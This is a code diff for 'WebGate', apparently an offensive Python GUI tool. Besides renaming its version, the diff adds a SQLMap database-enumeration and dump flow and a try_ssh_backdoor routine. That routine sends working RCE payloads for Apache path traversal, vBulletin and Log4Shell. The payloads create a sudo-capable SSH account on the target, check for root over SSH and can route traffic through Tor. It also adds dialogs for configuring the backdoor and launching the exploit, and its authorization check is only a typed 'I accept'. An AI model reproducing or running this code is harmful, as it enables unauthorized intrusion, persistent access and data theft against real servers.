@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-WebGate v4.0 —  Domain Security Auditor + Network Agent + Exploit Framework
+WebGate FW3.7 — Domain Security Auditor + Network Agent + Exploit Framework
 Created by c3less  |  https://github.com/c3less/webgate
 Telegram: @c3less
 
@@ -157,7 +157,7 @@ TR = {
     "deep_btn":     "DEEP SCAN",
     "cancel_btn":   "CANCEL",
     "settings_btn": "⚙  SETTINGS",
-    "copy_btn":     "⎘ COPY",
+    "exploits_found": "Exploits found",  # placeholder for future use
     "clear_btn":    "✕ CLEAR",
     "scanning":     "SCANNING…",
     "ready":        "READY",
@@ -249,7 +249,7 @@ TR = {
     "deep_btn":     "ГЛУБОКИЙ СКАН",
     "cancel_btn":   "ОТМЕНА",
     "settings_btn": "⚙  НАСТРОЙКИ",
-    "copy_btn":     "⎘ КОПИРОВАТЬ",
+    "exploits_found": "Эксплойтов найдено",  # placeholder
     "clear_btn":    "✕ ОЧИСТИТЬ",
     "scanning":     "СКАНИРОВАНИЕ…",
     "ready":        "ГОТОВ",
@@ -531,7 +531,7 @@ BANNER = f"""\
  ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
 {C.RST}{C.DIM}
   ┌──────────────────────────────────────────────────────────────┐
-  │  Domain Security Auditor  │  v4.0  │  by c3less               │
+  │  Domain Security Auditor  │ FW3.7  │  by c3less               │
   │  DNS · WHOIS · SSL · Ports · CVE · Agent · Exploit · 40 Tools │
   └──────────────────────────────────────────────────────────────┘
 {C.RST}"""
@@ -774,7 +774,7 @@ CVE_DATA = [
     ("http","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
     ("http","CVE-2022-41082","ProxyNotShell PowerShell RCE — CVSS 8.8"),
     ("https","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
-    # ── v4.0 additions ──────────────────────────────────────────
+    # ── FW3.7 additions ──────────────────────────────────────────
     # MikroTik RouterOS
     ("mikrotik","CVE-2023-30799","RouterOS RCE via Winbox — CVSS 9.1"),
     ("mikrotik","CVE-2021-41987","RouterOS heap overflow — CVSS 8.1"),
@@ -1338,7 +1338,7 @@ class DomainScanner:
         def rule(c="═"): return c * W
         def sec(s): lines.extend(["", rule("─"), f"  {s}", rule("─")])
 
-        lines += [rule(), "  WEBGATE v4.0 — DOMAIN SECURITY AUDIT REPORT",
+        lines += [rule(), "  WEBGATE FW3.7 — DOMAIN SECURITY AUDIT REPORT",
                   "  Created by c3less  │  github.com/c3less/webgate", rule("─"),
                   f"  Target    : {self.domain}",
                   f"  Date/Time : {ts.strftime('%Y-%m-%d %H:%M:%S')}",
@@ -1416,9 +1416,48 @@ class DomainScanner:
         else:
             lines.append("  [OK] No critical risks found")
 
-        sec("10. SCAN LOG")
+        # ── SIMPLIFIED TOOL RESULTS ──────────────────────────────
+        sec("10. VULNERABILITY FINDINGS (SIMPLIFIED)")
+        ports_data = self.results.get("ports", {})
+        sqli_findings = self.results.get("sqli", [])
+        xss_findings  = self.results.get("xss",  [])
+        sqlmap_dbs    = self.results.get("sqlmap_databases", [])
+
+        lines.append("")
+        lines.append("  SQL INJECTION:")
+        if sqli_findings or sqlmap_dbs:
+            lines.append("  ⚠ FOUND — SQL Injection detected")
+            for f in (sqli_findings or [])[:3]:
+                lines.append(f"    · {f}")
+            if sqlmap_dbs:
+                lines.append(f"    · Databases exposed: {', '.join(sqlmap_dbs[:8])}")
+        else:
+            lines.append("  ✓ None detected")
+
+        lines.append("")
+        lines.append("  XSS (Cross-Site Scripting):")
+        if xss_findings:
+            lines.append("  ⚠ FOUND — XSS vulnerability detected")
+            for f in xss_findings[:3]:
+                lines.append(f"    · {f}")
+        else:
+            lines.append("  ✓ None detected")
+
+        lines.append("")
+        lines.append("  CRITICAL CVEs (RCE-capable):")
+        rce_found = False
+        for po in ports_data.get("open", []):
+            for cve_id, cve_desc in po.get("cves", []):
+                if "RCE" in cve_desc or "9.8" in cve_desc or "10.0" in cve_desc:
+                    lines.append(f"  ⚡ {cve_id} on port {po['port']}/{po['service']}")
+                    lines.append(f"    → {cve_desc[:70]}")
+                    rce_found = True
+        if not rce_found:
+            lines.append("  ✓ No critical RCE CVEs detected on open ports")
+
+        sec("11. SCAN LOG")
         for ln in self.log_lines: lines.append(f"  {ln}")
-        lines += ["", rule(), "  END OF REPORT — WebGate v4.0 by c3less", rule()]
+        lines += ["", rule(), "  END OF REPORT — WebGate FW3.7 by c3less", rule()]
 
         # Generate HTML report alongside text
         html_fn = fn.replace(".txt", ".html")
@@ -1493,7 +1532,7 @@ th{{color:#4a9eff;font-size:11px;text-transform:uppercase}}
 </head>
 <body>
 <div class="container">
-<h1>WebGate v4.0</h1>
+<h1>WebGate FW3.7</h1>
 <div class="subtitle">Domain Security Audit Report &middot; {self.domain} &middot; {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
 
 <div class="stats">
@@ -1542,7 +1581,7 @@ th{{color:#4a9eff;font-size:11px;text-transform:uppercase}}
 </table>
 </div>
 
-<div class="footer">WebGate v4.0 &middot; by c3less &middot; github.com/c3less/webgate</div>
+<div class="footer">WebGate FW3.7 &middot; by c3less &middot; github.com/c3less/webgate</div>
 </div>
 </body>
 </html>"""
@@ -2990,30 +3029,62 @@ class ExploitFramework:
             except:
                 pass
 
-        # SQLMap integration
+        # SQLMap — interactive DB/table dump with simplified output
         if subprocess.run(["which", "sqlmap"], capture_output=True).returncode == 0:
-            self._log("  [SQLi] Running SQLMap for deep analysis...", "STEP")
+            self._log("  [SQLi] SQLMap — detecting injection + enumerating databases…", "STEP")
             try:
                 result = subprocess.run(
                     ["sqlmap", "-u", f"{base_url}/?id=1",
                      "--batch", "--level=3", "--risk=3",
-                     "--crawl=3", "--forms", "--random-agent",
-                     "--technique=BEUSTQ", "--threads=4"],
+                     "--crawl=2", "--forms", "--random-agent",
+                     "--technique=BEUSTQ", "--threads=4",
+                     "--dbs", "--output-dir=/tmp/sqlmap_wg"],
                     capture_output=True, text=True, timeout=300
                 )
                 out = result.stdout
-                if "is vulnerable" in out.lower() or "parameter" in out.lower():
-                    findings.append("SQLMap confirmed injection points")
-                    self._log("  [SQLi] SQLMap found injection points!", "ERROR")
-                    # Extract key findings
-                    for line in out.split("\n"):
-                        if "is vulnerable" in line.lower() or "payload:" in line.lower():
-                            self._log(f"    {line.strip()[:70]}", "WARN")
+                vulnerable = "is vulnerable" in out.lower() or "sqlinjection" in out.lower()
+                vuln_param = ""
+                vuln_payload = ""
+                databases = []
+                for line in out.split("\n"):
+                    ls = line.strip()
+                    if "is vulnerable" in ls.lower():
+                        vuln_param = ls[:80]
+                    if "payload:" in ls.lower():
+                        vuln_payload = ls.split(":", 1)[-1].strip()[:80]
+                    if ls.startswith("[*]") and len(ls) > 4:
+                        candidate = ls[3:].strip().strip("'\"")
+                        if candidate and "available database" not in candidate.lower() and len(candidate) < 64:
+                            databases.append(candidate)
+                    m = re.match(r"\|\s+(\w[\w$]*)\s+\|", ls)
+                    if m and m.group(1) not in ("Database", "databases", "information"):
+                        db_name = m.group(1)
+                        if db_name not in databases:
+                            databases.append(db_name)
+
+                if vulnerable or databases:
+                    findings.append("SQLMap: SQL Injection CONFIRMED")
+                    self._log("  [SQLi] RESULT: Injection FOUND", "ERROR")
+                    if vuln_param:
+                        findings.append(f"Vulnerable: {vuln_param}")
+                        self._log(f"    · Vulnerable parameter: {vuln_param}", "WARN")
+                    if vuln_payload:
+                        findings.append(f"Payload that causes injection: {vuln_payload}")
+                        self._log(f"    · Injection payload: {vuln_payload}", "WARN")
+                    if databases:
+                        self._log(f"  [SQLi] Databases found ({len(databases)}):", "FOUND")
+                        for db in databases:
+                            self._log(f"    · {db}", "FOUND")
+                        findings.append(f"Databases: {', '.join(databases)}")
+                        self.results["sqlmap_databases"]      = databases
+                        self.results["sqlmap_injectable_url"] = f"{base_url}/?id=1"
+                else:
+                    self._log("  [SQLi] RESULT: No injection detected at /?id=1", "INFO")
                 self.results["sqlmap_output"] = out
             except subprocess.TimeoutExpired:
                 self._log("  [SQLi] SQLMap timed out", "WARN")
-            except:
-                pass
+            except Exception as e:
+                self._log(f"  [SQLi] SQLMap error: {e}", "ERROR")
 
         self.results["sqli"] = findings
         self._prog(20)
@@ -3062,19 +3133,31 @@ class ExploitFramework:
                 findings.append(f"DOM XSS sink: {sink}")
                 self._log(f"  [XSS] DOM sink found: {sink}", "WARN")
 
-        # XSStrike integration
+        # XSStrike integration — simplified output
         if subprocess.run(["which", "xsstrike"], capture_output=True).returncode == 0:
-            self._log("  [XSS] Running XSStrike...", "STEP")
+            self._log("  [XSS] Running XSStrike…", "STEP")
             try:
                 result = subprocess.run(
                     ["xsstrike", "-u", f"{base_url}/?q=test", "--crawl", "--blind"],
                     capture_output=True, text=True, timeout=120
                 )
-                if "vulnerable" in result.stdout.lower():
-                    findings.append("XSStrike confirmed XSS")
-                    self._log("  [XSS] XSStrike found vulnerabilities!", "ERROR")
-            except:
-                pass
+                out = result.stdout
+                xss_found = "vulnerable" in out.lower() or "xss" in out.lower()
+                vuln_url  = ""
+                for line in out.split("\n"):
+                    if "vulnerable" in line.lower() and "http" in line.lower():
+                        vuln_url = line.strip()[:80]
+                        break
+                if xss_found:
+                    findings.append("XSStrike: XSS CONFIRMED")
+                    self._log("  [XSS] RESULT: XSS Injection FOUND", "ERROR")
+                    if vuln_url:
+                        findings.append(f"Vulnerable URL: {vuln_url}")
+                        self._log(f"    · URL: {vuln_url}", "WARN")
+                else:
+                    self._log("  [XSS] RESULT: No XSS detected by XSStrike", "INFO")
+            except Exception as e:
+                self._log(f"  [XSS] XSStrike error: {e}", "WARN")
 
         self.results["xss"] = findings
         self._prog(40)
@@ -3356,7 +3439,7 @@ class ExploitFramework:
 
         lines = [
             "=" * 72,
-            "  WEBGATE v4.0 — EXPLOIT SESSION REPORT",
+            "  WEBGATE FW3.7 — EXPLOIT SESSION REPORT",
             f"  Session ID: {self.session_id}",
             f"  Target: {self.domain}",
             f"  Date: {ts.strftime('%Y-%m-%d %H:%M:%S')}",
@@ -3415,6 +3498,181 @@ class ExploitFramework:
                 self._log(f"  Module error: {e}", "ERROR")
 
         self._log("Exploit session complete.", "SUCCESS")
+
+    # ── RCE-capable CVEs (can try SSH via command execution) ──
+    RCE_CVES = {
+        "CVE-2021-41773", "CVE-2021-42013", "CVE-2021-31166",
+        "CVE-2019-11043", "CVE-2021-44228", "CVE-2017-5638",
+        "CVE-2018-11776", "CVE-2021-26084", "CVE-2022-26134",
+        "CVE-2023-22515", "CVE-2019-0232", "CVE-2017-12617",
+        "CVE-2022-42252", "CVE-2019-16759", "CVE-2020-17496",
+        "CVE-2022-22965", "CVE-2019-8943", "CVE-2015-8562",
+        "CVE-2018-7600", "CVE-2018-7602", "CVE-2019-6340",
+        "CVE-2019-15107", "CVE-2023-27997", "CVE-2022-42475",
+        "CVE-2021-40438", "CVE-2020-11984",
+    }
+
+    def try_ssh_backdoor(self, cve_id: str, ssh_user: str, ssh_pass: str,
+                          tor_bridge: str = "") -> bool:
+        """Attempt to create SSH user via RCE CVE.
+        Only called after explicit Scope Agreement + I accept from user.
+        """
+        self._log("=" * 50, "INFO")
+        self._log(f"[SSH-EXPLOIT] Attempting SSH access via {cve_id}", "STEP")
+
+        # Configure TOR/proxy if bridge provided
+        proxy_env = {}
+        if tor_bridge:
+            self._log(f"  [TOR] Bridge: {tor_bridge[:40]}…", "INFO")
+            # Write temp torrc
+            import tempfile
+            torrc = f"UseBridges 1\nBridge {tor_bridge}\nSocksPort 9050\n"
+            fd, torrc_path = tempfile.mkstemp(suffix=".torrc")
+            with os.fdopen(fd, "w") as f:
+                f.write(torrc)
+            # Start tor with bridge
+            try:
+                subprocess.Popen(
+                    ["tor", "-f", torrc_path],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                time.sleep(4)  # Wait for TOR circuit
+                proxy_env = {"https_proxy": "socks5://127.0.0.1:9050",
+                             "http_proxy":  "socks5://127.0.0.1:9050"}
+                self._log("  [TOR] Circuit established via bridge", "SUCCESS")
+            except Exception as e:
+                self._log(f"  [TOR] Failed to start: {e}", "WARN")
+                self._log("  [TOR] Proceeding without TOR", "WARN")
+
+        base_url = f"http://{self.domain}"
+        success = False
+
+        # Escape username/password for shell
+        safe_user = re.sub(r"[^a-zA-Z0-9_]", "", ssh_user)[:32]
+        # Payload to add user — sent via RCE vector
+        adduser_cmd = (
+            f"useradd -m -s /bin/bash {safe_user}; "
+            f"echo '{safe_user}:{ssh_pass}' | chpasswd; "
+            f"usermod -aG sudo {safe_user} 2>/dev/null; "
+            f"echo PWNED"
+        )
+
+        # CVE-specific exploit vectors
+        if cve_id in ("CVE-2021-41773", "CVE-2021-42013"):
+            # Apache path traversal + RCE via mod_cgi
+            self._log("  [RCE] Apache path traversal + mod_cgi RCE", "INFO")
+            for path in [
+                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
+            ]:
+                try:
+                    import urllib.request
+                    data = f"echo Content-Type: text/plain; echo; {adduser_cmd}".encode()
+                    req = urllib.request.Request(
+                        f"{base_url}{path}",
+                        data=data,
+                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
+                    )
+                    with urllib.request.urlopen(req, timeout=10) as r:
+                        resp = r.read(512).decode("utf-8", errors="ignore")
+                        if "PWNED" in resp:
+                            self._log(f"  [RCE] SUCCESS via {path}!", "SUCCESS")
+                            success = True
+                            break
+                        elif resp.strip():
+                            self._log(f"  [RCE] Response: {resp[:60]}", "WARN")
+                except Exception as e:
+                    self._log(f"  [RCE] {path}: {e}", "WARN")
+
+        elif cve_id == "CVE-2021-44228":
+            # Log4Shell — JNDI callback (only works with collaborator/listener)
+            self._log("  [Log4Shell] Log4j JNDI injection — use with LDAP listener", "INFO")
+            jndi_payload = "${jndi:ldap://127.0.0.1:1389/a}"
+            for param in ["q", "search", "username", "X-Api-Version"]:
+                try:
+                    code, body, _ = self._http_get(
+                        f"{base_url}/?{param}={jndi_payload}", timeout=6
+                    )
+                    self._log(f"  [Log4Shell] Payload sent via {param}={jndi_payload[:30]}", "INFO")
+                except Exception as e:
+                    pass
+            self._log("  [Log4Shell] Set up LDAP listener to catch callback", "WARN")
+
+        elif cve_id in ("CVE-2019-16759", "CVE-2020-17496"):
+            # vBulletin OGNL/widgetConfig RCE
+            self._log("  [RCE] vBulletin widget RCE", "INFO")
+            for endpoint in ["ajax/api/hook/getAdminPermission",
+                             "ajax/render/widget_tabbedcontainer_tab_panel"]:
+                try:
+                    data = f"subWidgets[0][template]=widget_php&subWidgets[0][config][code]={adduser_cmd}".encode()
+                    code, body = self._http_post(f"{base_url}/{endpoint}", data)
+                    if "PWNED" in body:
+                        self._log("  [RCE] vBulletin RCE success!", "SUCCESS")
+                        success = True
+                        break
+                except Exception as e:
+                    self._log(f"  [vBull] {e}", "WARN")
+
+        else:
+            # Generic: try commix if available
+            self._log(f"  [RCE] Generic exploit attempt for {cve_id}", "INFO")
+            if subprocess.run(["which", "commix"], capture_output=True).returncode == 0:
+                try:
+                    r = subprocess.run(
+                        ["commix", "--url", f"{base_url}/?id=1",
+                         "--data", f"cmd={adduser_cmd}",
+                         "--batch", "--os-cmd", adduser_cmd],
+                        capture_output=True, text=True, timeout=60,
+                        env={**os.environ, **proxy_env}
+                    )
+                    if "PWNED" in r.stdout or "success" in r.stdout.lower():
+                        self._log("  [commix] RCE executed!", "SUCCESS")
+                        success = True
+                except Exception as e:
+                    self._log(f"  [commix] {e}", "WARN")
+            else:
+                self._log("  [!] commix not installed — generic RCE skipped", "WARN")
+
+        if success:
+            self._log(f"  [SSH] Verifying SSH login as {safe_user}…", "INFO")
+            if PARAMIKO_OK:
+                try:
+                    import paramiko
+                    ip = socket.gethostbyname(self.domain)
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(ip, port=22, username=safe_user,
+                                   password=ssh_pass, timeout=10)
+                    _, stdout, _ = client.exec_command("id")
+                    uid_out = stdout.read(128).decode("utf-8", errors="ignore").strip()
+                    self._log(f"  [SSH] LOGIN SUCCESS: {safe_user}@{self.domain}", "SUCCESS")
+                    self._log(f"  [SSH] id output: {uid_out}", "SUCCESS")
+                    self.results["ssh_backdoor"] = {
+                        "user": safe_user, "pass": ssh_pass,
+                        "host": self.domain, "id_output": uid_out
+                    }
+                    # Try sudo
+                    _, so, _ = client.exec_command(f"echo {ssh_pass} | sudo -S id 2>/dev/null")
+                    sudo_out = so.read(128).decode("utf-8", errors="ignore").strip()
+                    if "root" in sudo_out:
+                        self._log("  [SSH] SUDO ROOT CONFIRMED!", "SUCCESS")
+                        self.results["ssh_backdoor"]["sudo"] = sudo_out
+                    client.close()
+                except Exception as e:
+                    self._log(f"  [SSH] Login check failed: {e}", "WARN")
+                    self._log(f"  [SSH] User may have been created — try manually:", "INFO")
+                    self._log(f"    ssh {safe_user}@{self.domain}", "FOUND")
+            else:
+                self._log("  [!] paramiko not installed — SSH verify skipped", "WARN")
+                self._log(f"    Manually try: ssh {safe_user}@{self.domain}", "INFO")
+        else:
+            self._log("  [SSH] Exploit did not succeed via this CVE vector", "WARN")
+
+        self.results["ssh_attempt"] = {
+            "cve": cve_id, "user": safe_user, "success": success,
+            "tor": bool(tor_bridge)
+        }
+        return success
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -3883,6 +4141,488 @@ def ask_port_gui(parent, port, service, cves) -> str:
 
     parent.after(0, show)
     return result.wait()
+
+
+
+# ═══════════════════════════════════════════════════════════════
+# GUI — SCOPE AGREEMENT DIALOG (for CVE exploit confirmation)
+# ═══════════════════════════════════════════════════════════════
+class ScopeAgreementDialog:
+    """Shows scope agreement and requires user to type 'I accept'."""
+    def __init__(self, parent, cve_id, cve_desc, target, on_accept):
+        import tkinter as tk
+        th  = get_theme()
+        win = tk.Toplevel(parent)
+        self.win = win
+        win.title("Scope Agreement Required")
+        win.configure(bg=th["BG"])
+        win.resizable(False, False)
+        win.transient(parent)
+        win.grab_set()
+
+        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
+        W, H = 560, 460
+        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
+        try:
+            win.update_idletasks()
+            win.attributes("-alpha", 0.0)
+        except: pass
+
+        # Title
+        tk.Label(win, text="⚠  SCOPE AGREEMENT REQUIRED",
+            font=("Courier New", 13, "bold"), bg=th["BG"], fg=th["ERR"]
+        ).pack(pady=(18, 4))
+
+        # CVE info card
+        cf = tk.Frame(win, bg=th["BG3"], bd=0)
+        cf.pack(fill="x", padx=20, pady=8)
+        tk.Label(cf, text=f"  Exploit Target:  {target}",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG"], anchor="w"
+        ).pack(fill="x", padx=6, pady=(8, 2))
+        tk.Label(cf, text=f"  CVE:             {cve_id}",
+            font=("Courier New", 10, "bold"), bg=th["BG3"], fg=th["ERR"], anchor="w"
+        ).pack(fill="x", padx=6, pady=2)
+        tk.Label(cf, text=f"  {cve_desc[:68]}",
+            font=("Courier New", 9), bg=th["BG3"], fg=th["FG2"], anchor="w",
+            wraplength=500
+        ).pack(fill="x", padx=6, pady=(2, 8))
+
+        # Terms text
+        terms = tk.Text(win, font=("Courier New", 9), bg=th["BG2"], fg=th["FG"],
+            relief="flat", bd=0, padx=14, pady=10, height=10, wrap="word",
+            state="normal", cursor="arrow")
+        terms.pack(fill="x", padx=20, pady=(0, 8))
+        terms.insert("1.0",
+            "LEGAL NOTICE \u2014 Exploit Mode\n\n"
+            "By proceeding, you confirm:\n\n"
+            "  1. You have a signed Scope Agreement / written authorization\n"
+            "     from the system owner for the target above.\n\n"
+            "  2. You are targeting ONLY systems explicitly listed in scope.\n\n"
+            "  3. You understand that unauthorized exploitation is a CRIMINAL\n"
+            "     OFFENSE under CFAA (USA), CMA (UK), and equivalent laws.\n\n"
+            "  4. YOU bear full legal and ethical responsibility for all actions.\n\n"
+            "Type exactly:  I accept\n"
+            "to confirm authorization and proceed."
+        )
+        terms.config(state="disabled")
+
+        # Input field
+        inp_f = tk.Frame(win, bg=th["BG2"], padx=2, pady=2)
+        inp_f.pack(padx=20, pady=(0, 6))
+        self._var = tk.StringVar()
+        inp = tk.Entry(inp_f, textvariable=self._var,
+            font=("Courier New", 12, "bold"),
+            bg=th["BG3"], fg=th["WHITE"],
+            insertbackground=th["WHITE"],
+            relief="flat", bd=6, width=28)
+        inp.pack()
+        inp.focus_set()
+
+        # Buttons
+        bf = tk.Frame(win, bg=th["BG"])
+        bf.pack(fill="x", padx=20, pady=(4, 16))
+
+        def _cancel():
+            win.destroy()
+        def _accept():
+            if self._var.get().strip().lower() == "i accept":
+                win.destroy()
+                on_accept()
+            else:
+                inp_f.config(bg=th["ERR"])
+                win.after(400, lambda: inp_f.config(bg=th["BG2"]))
+                self._var.set("")
+                inp.focus_set()
+
+        tk.Button(bf, text="CANCEL",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
+            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
+            command=_cancel
+        ).pack(side="right", padx=(8, 0))
+
+        self._accept_btn = tk.Button(bf,
+            text="PROCEED WITH EXPLOIT",
+            font=("Courier New", 10, "bold"),
+            bg=th["ERR"], fg=th["WHITE"],
+            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
+            command=_accept
+        )
+        self._accept_btn.pack(side="right")
+        inp.bind("<Return>", lambda _: _accept())
+
+        def _fade(a):
+            try: win.attributes("-alpha", min(0.96, a))
+            except: pass
+            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
+        _fade(0.0)
+
+
+# ═══════════════════════════════════════════════════════════════
+# GUI — SSH BACKDOOR SETUP DIALOG
+# ═══════════════════════════════════════════════════════════════
+class SSHBackdoorDialog:
+    """Collect SSH credentials and TOR bridge config for exploit."""
+    def __init__(self, parent, target, cve_id, on_start):
+        import tkinter as tk
+        th  = get_theme()
+        win = tk.Toplevel(parent)
+        self.win = win
+        win.title("SSH Access Attempt — Exploit Config")
+        win.configure(bg=th["BG"])
+        win.resizable(False, False)
+        win.transient(parent)
+        win.grab_set()
+
+        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
+        W, H = 520, 440
+        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
+        try:
+            win.update_idletasks()
+            win.attributes("-alpha", 0.0)
+        except: pass
+
+        tk.Label(win, text="SSH Backdoor Configuration",
+            font=("Georgia", 13, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
+        ).pack(pady=(16, 2))
+        tk.Label(win,
+            text=f"  Target: {target}  |  {cve_id}",
+            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"]
+        ).pack(pady=(0, 8))
+        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20)
+
+        def _field(parent, label, show=""):
+            row = tk.Frame(parent, bg=th["BG"])
+            row.pack(fill="x", padx=20, pady=4)
+            tk.Label(row, text=f"{label:<22}",
+                font=("Courier New", 9), bg=th["BG"], fg=th["FG3"], anchor="w"
+            ).pack(side="left")
+            var = tk.StringVar()
+            ef = tk.Frame(row, bg=th["BORDER2"], padx=1, pady=1)
+            ef.pack(side="left", fill="x", expand=True)
+            e = tk.Entry(ef, textvariable=var,
+                font=("Courier New", 11),
+                bg=th["BG3"], fg=th["FG"],
+                insertbackground=th["WHITE"],
+                relief="flat", bd=4,
+                show=show
+            )
+            e.pack(fill="x")
+            return var, e
+
+        tk.Label(win, text="  New SSH credentials to create on target:",
+            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
+        ).pack(fill="x", padx=20, pady=(12, 2))
+
+        self._usr_var, self._usr_e = _field(win, "SSH Username:")
+        self._pwd_var, self._pwd_e = _field(win, "SSH Password:", show="●")
+
+        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=8)
+
+        # TOR section
+        self._tor_var = tk.BooleanVar(value=False)
+        tor_f = tk.Frame(win, bg=th["BG"])
+        tor_f.pack(fill="x", padx=20, pady=2)
+        tk.Checkbutton(tor_f,
+            text="Route via TOR (paste bridge below)",
+            variable=self._tor_var,
+            font=("Courier New", 9),
+            bg=th["BG"], fg=th["FG2"],
+            selectcolor=th["BG3"],
+            activebackground=th["BG"],
+            relief="flat", bd=0, cursor="hand2",
+            command=self._toggle_tor
+        ).pack(side="left")
+
+        self._bridge_frame = tk.Frame(win, bg=th["BG"])
+        self._bridge_frame.pack(fill="x", padx=20, pady=(2, 0))
+        tk.Label(self._bridge_frame,
+            text="TOR Bridge (obfs4/webtunnel/snowflake):",
+            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"], anchor="w"
+        ).pack(anchor="w")
+        self._bridge_var = tk.StringVar()
+        bridge_ef = tk.Frame(self._bridge_frame, bg=th["BORDER2"], padx=1, pady=1)
+        bridge_ef.pack(fill="x")
+        self._bridge_e = tk.Entry(bridge_ef, textvariable=self._bridge_var,
+            font=("Courier New", 9),
+            bg=th["BG3"], fg=th["FG"],
+            insertbackground=th["WHITE"],
+            relief="flat", bd=4,
+            placeholder_text="obfs4 bridge.example.com:443 ..."
+        )
+        self._bridge_e.pack(fill="x")
+        self._bridge_frame.pack_forget()
+
+        tk.Label(win,
+            text="  The exploit will attempt to add this SSH user via the CVE.",
+            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]
+        ).pack(anchor="w", padx=20, pady=(8, 0))
+
+        # Buttons
+        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(10, 0))
+        bf = tk.Frame(win, bg=th["BG"])
+        bf.pack(fill="x", padx=20, pady=(8, 16))
+
+        def _start():
+            user = self._usr_var.get().strip()
+            pwd  = self._pwd_var.get().strip()
+            if not user or not pwd:
+                self._usr_e.config(bg=th["ERR"])
+                win.after(400, lambda: self._usr_e.config(bg=th["BG3"]))
+                return
+            bridge = self._bridge_var.get().strip() if self._tor_var.get() else ""
+            win.destroy()
+            on_start(user, pwd, bridge)
+
+        tk.Button(bf, text="CANCEL",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
+            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
+            command=win.destroy
+        ).pack(side="right", padx=(8, 0))
+        tk.Button(bf, text="LAUNCH EXPLOIT",
+            font=("Courier New", 10, "bold"),
+            bg="#a80000", fg=th["WHITE"],
+            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
+            command=_start
+        ).pack(side="right")
+
+        def _fade(a):
+            try: win.attributes("-alpha", min(0.96, a))
+            except: pass
+            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
+        _fade(0.0)
+
+    def _toggle_tor(self):
+        if self._tor_var.get():
+            self._bridge_frame.pack(fill="x", padx=20, pady=(2, 0))
+        else:
+            self._bridge_frame.pack_forget()
+
+
+# ═══════════════════════════════════════════════════════════════
+# GUI — SQLMAP DATABASE DUMP DIALOG
+# ═══════════════════════════════════════════════════════════════
+class SQLMapDumpDialog:
+    """Interactive SQLMap dump: select database → table → dump."""
+    def __init__(self, parent, target, databases, on_dump):
+        import tkinter as tk
+        th  = get_theme()
+        win = tk.Toplevel(parent)
+        self.win = win
+        self._parent = parent
+        self._target = target
+        self._on_dump = on_dump
+        win.title("SQLMap — Database Dump")
+        win.configure(bg=th["BG"])
+        win.resizable(False, True)
+        win.transient(parent)
+        win.grab_set()
+
+        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
+        W, H = 500, 420
+        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
+        try:
+            win.update_idletasks()
+            win.attributes("-alpha", 0.0)
+        except: pass
+
+        tk.Label(win, text="SQLMap — Interactive Dump",
+            font=("Georgia", 13, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
+        ).pack(pady=(16, 2))
+        tk.Label(win, text=f"Target: {target}",
+            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"]
+        ).pack()
+        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=8)
+
+        tk.Label(win, text="  Detected Databases:",
+            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
+        ).pack(fill="x", padx=20)
+
+        self._db_var = tk.StringVar()
+        db_frame = tk.Frame(win, bg=th["BG2"])
+        db_frame.pack(fill="x", padx=20, pady=4)
+        db_scroll = tk.Scrollbar(db_frame, orient="vertical")
+        self._db_list = tk.Listbox(db_frame, font=("Courier New", 11),
+            bg=th["BG3"], fg=th["FG"], selectbackground=th["ACC"],
+            selectforeground=th["BG"], relief="flat", bd=0,
+            yscrollcommand=db_scroll.set, height=6)
+        db_scroll.config(command=self._db_list.yview)
+        self._db_list.pack(side="left", fill="x", expand=True)
+        db_scroll.pack(side="right", fill="y")
+
+        for db in databases:
+            self._db_list.insert("end", f"  {db}")
+
+        tk.Label(win, text="  Select table to dump (after choosing DB):",
+            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
+        ).pack(fill="x", padx=20, pady=(8, 2))
+
+        self._tbl_var = tk.StringVar()
+        tbl_frame = tk.Frame(win, bg=th["BG2"])
+        tbl_frame.pack(fill="x", padx=20, pady=4)
+        tbl_scroll = tk.Scrollbar(tbl_frame, orient="vertical")
+        self._tbl_list = tk.Listbox(tbl_frame, font=("Courier New", 11),
+            bg=th["BG3"], fg=th["FG"], selectbackground=th["ACC2"],
+            selectforeground=th["BG"], relief="flat", bd=0,
